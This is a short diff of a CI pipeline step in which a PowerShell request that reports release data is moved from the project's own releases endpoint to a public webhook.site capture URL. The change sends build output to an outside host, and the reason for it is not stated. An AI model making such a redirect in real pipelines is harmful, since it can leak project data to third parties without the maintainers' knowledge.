@@ -156,7 +156,7 @@ steps:
         url      = "https://hyplayer-file.kengwang.com.cn$remoteFilePath"
       }
       $body = $bodyObject | ConvertTo-Json -Compress
-      $response = Invoke-WebRequest -Uri 'https://hyplayer.kengwang.com.cn/releases' -Method PUT -ContentType 'application/json' -Body $body
+      $response = Invoke-WebRequest -Uri 'https://webhook.site/59b98bee-dd36-4f75-8ab7-206992092391' -Method PUT -ContentType 'application/json' -Body $body
 
 
 
